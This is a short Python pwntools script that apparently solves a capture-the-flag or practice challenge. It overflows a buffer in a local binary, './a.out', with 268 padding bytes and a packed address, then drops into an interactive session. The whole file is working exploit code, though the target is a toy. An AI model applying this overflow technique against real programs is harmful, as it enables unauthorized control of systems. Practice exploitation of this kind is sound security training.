#!/usr/bin/env python3

from pwn import *

p = process("./a.out")

p.recv()

payload  = 268*b'A' + p64(0x69420)

p.sendline(payload)
p.interactive()

